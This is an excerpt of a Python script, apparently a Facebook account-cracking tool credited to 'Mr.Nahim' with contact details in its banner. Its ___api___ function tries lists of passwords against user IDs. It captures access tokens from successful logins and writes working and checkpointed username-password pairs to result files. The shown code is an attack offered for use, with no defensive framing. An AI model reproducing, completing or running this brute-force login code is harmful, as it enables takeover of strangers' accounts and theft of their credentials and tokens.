...
\033[1;91m    / /\ \ |  __| |  _  /   / /\ \ | . ` |
\033[1;91m   / ____ \| |    | | \ \  / ____ \| |\  |
\033[1;91m  /_/    \_\_|    |_|  \_\/_/    \_\_| \_|

\033[1;92m Mr.Nahim (Cyber 420 The Silent Killer's)
\033[1;92m Facebook:- Chand Muhammad Khan 
\033[1;92m WhatsApps:- 01790104683
"""%(H,P,H,B))
...
def ___login___():
    ...
    try:
        ...
        print("%s[%s!%s]%s Token Error"%(M,P,M,P));sleep(3);___login___()
...
def ___api___(total, uid, pwx):
    ...
    sys.stdout.write(
        "\r\x1b[1;97m[Mr.Nahim] %s/%s Ok:-%s - Cp:-%s "%(loop, len(total), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ...
            if 'session_key' in send.text and 'EAAA' in send.text:
                print("\r\x1b[1;92m[Mr.Nahim-Ok] %s|%s|%s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Mr.Nahim-Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
                ...
                print("\r\x1b[1;93m[Mr.Nahim-Cp] %s|%s|%s\x1b[1;97m"%(uid, pw,___lahir))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Mr.Nahim-Cp.txt","a").write("%s|%s|%s\n"%(uid, pw,___lahir))
                break
            else:
                continue
        loop +=1
